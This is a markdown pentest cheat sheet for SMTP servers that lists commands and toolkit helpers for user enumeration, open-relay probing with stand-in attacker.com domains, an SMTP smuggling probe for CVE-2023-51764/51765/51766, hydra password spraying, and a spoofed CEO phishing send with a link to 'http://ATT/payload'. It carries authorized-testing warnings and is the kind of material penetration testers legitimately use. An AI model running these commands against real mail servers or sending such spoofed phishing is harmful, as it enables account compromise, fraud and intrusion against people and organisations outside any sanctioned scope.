---
service: smtp
title: SMTP
ports: 25, 465, 587
aliases: sendmail, postfix, exim, exchange
---

# SMTP — quick wins

**When you see it:** 25/tcp (or 465/587) open, `220` banner → check EHLO capabilities
first, then VRFY/EXPN for user enum; open relay is the highest-impact finding.

> Authorized testing only. Triage is read-only; steps marked ✏️ send mail or alter
> state on the target — get explicit scope sign-off before any send.

## Triage (read-only)
```sh
nc -nv H 25                                              # banner — note MTA + version
printf 'EHLO recon.local\r\nQUIT\r\n' | nc -nv H 25    # capability matrix (STARTTLS, AUTH, VRFY)
nmap -Pn -p25,465,587 --script smtp-commands,smtp-open-relay,smtp-ntlm-info H
openssl s_client -connect H:587 -starttls smtp           # STARTTLS cert + version
```

## Quick wins

### VRFY / EXPN user enumeration
```sh
# Manual (one user):
printf 'EHLO recon.local\r\nVRFY root\r\nQUIT\r\n' | nc -nv H 25
printf 'EHLO recon.local\r\nEXPN staff\r\nQUIT\r\n'  | nc -nv H 25

# Bulk — repo helper:
standalones/smtp/smtp-user-enum.sh -t H -U WORDLIST -m VRFY
standalones/smtp/smtp-user-enum.sh -t H -U WORDLIST -m EXPN
```
*Why:* 250 = user exists, 550 = unknown. VRFY/EXPN are often disabled; fall through to
RCPT method below. Valid usernames feed password spray or phishing target lists.

### RCPT TO user enumeration (most reliable)
```sh
standalones/smtp/smtp-user-enum.sh -t H -U WORDLIST -m RCPT -f probe@DOMAIN
```
*Why:* RCPT TO must resolve recipients for mail delivery — even servers with VRFY/EXPN
disabled (Postfix, Exim defaults) distinguish valid from invalid users at RCPT stage.
Response-time timing is a secondary signal for catch-all servers.

### Open relay test ✏️
```sh
# Manual probe:
telnet H 25
EHLO attacker.com
MAIL FROM:<external@attacker.com>
RCPT TO:<external@victim.com>    # if 250 here → relay confirmed open
DATA
Subject: relay test
Test.
.

# Full 19-variation sweep (repo helper):
standalones/smtp/smtp-relay-test.sh -t H --from-domain attacker.com --to-domain victim.com
```
*Why:* an open relay accepts and forwards mail from external senders to external
recipients. The relay test probes canonical and non-canonical RCPT forms (%-encoding,
!-bang path, source routing) because servers often block the obvious form but allow
an encoded variant.

### Phishing / spoof send via confirmed relay ✏️
```sh
standalones/smtp/smtp-phish-send.sh \
  --target H \
  --from "ceo@DOMAIN" --from-name "CEO Name" \
  --to "TARGET_USER@DOMAIN" \
  --subject "Urgent: action required" \
  --body-text "Click here: http://ATT/payload"
```
*Why:* gated helper — only sends when called explicitly. Use after `smtp-relay-test.sh`
confirms a relay path. Headers are written verbatim so SPF/DKIM analysis in the
`spf-dmarc-check.sh` output should inform spoofing feasibility first.

### SPF / DMARC posture check (read-only)
```sh
standalones/smtp/spf-dmarc-check.sh DOMAIN
```
*Why:* determines whether external spoofing of DOMAIN is viable. A missing or `~all`
(softfail) SPF record + absent DMARC = phishing emails will land in target inboxes.

### SMTP smuggling — CVE-2023-51764/51765/51766 ✏️
```sh
# Probe (sends a crafted message; version-specific):
python3 standalones/smtp/smtp-smuggling-test.py --target H --port 25 --from probe@attacker.com --to admin@DOMAIN
```
*Why:* exploits inbound/outbound MTA disagreement on end-of-data markers (`\n.\n` vs
`\r\n.\r\n`). A vulnerable inbound MTA lets you inject a second message that exits the
outbound with a spoofed internal sender — bypassing DMARC/SPF against the internal
domain. Affected: Postfix (51764), Sendmail (51765), Exim ≤4.97 (51766).
Version-specific: check banner and MTA before running.

## aranum helpers
- `aranumtoolkit/network/enum-smtp.sh` — banner, EHLO capability matrix, VRFY/EXPN probe,
  STARTTLS cert grab, open-relay smoke test; results feed all standalones below.
- `standalones/smtp/smtp-user-enum.sh` — VRFY/EXPN/RCPT bulk user enumeration with
  timing-aware catch-all detection.
- `standalones/smtp/smtp-relay-test.sh` — 19-variation open relay sweep.
- `standalones/smtp/smtp-phish-send.sh` — spoofed send via confirmed relay (✏️ send gate).
- `standalones/smtp/smtp-smuggling-test.py` — CVE-2023-5176x probe (✏️ send gate).
- `standalones/smtp/spf-dmarc-check.sh` — SPF/DMARC/DKIM posture read-only analysis.

## Gotchas
- Many servers return 252 ("cannot verify") for VRFY to avoid enumeration while still
  technically implementing it; treat 250 as confirmed, 550 as not-found, 252 as ambiguous.
- `smtp-open-relay` NSE can produce false positives — always follow up with a manual
  `telnet` session to confirm the relay actually delivers.
- STARTTLS downgrade: if the server offers STARTTLS but doesn't enforce it, connect
  plaintext on 25 and credentials remain capturable on-path.
- Auth methods (LOGIN, PLAIN, CRAM-MD5) in EHLO output → credential spray with
  `hydra -l USER -P WORDLIST smtp://H`.
- Smuggling requires both an inbound (accepting) and outbound (forwarding) MTA in the
  path; it does not apply to a standalone MX with no smarthost relay.

## Sources
- HackTricks `25,465,587-pentesting-smtp`; Hackviser SMTP; pentestmonkey `smtp-user-enum`;
  LuemmelSec "Pentest Everything SMTP"; smtpsmuggling.com; CVE-2023-51764/51765/51766.
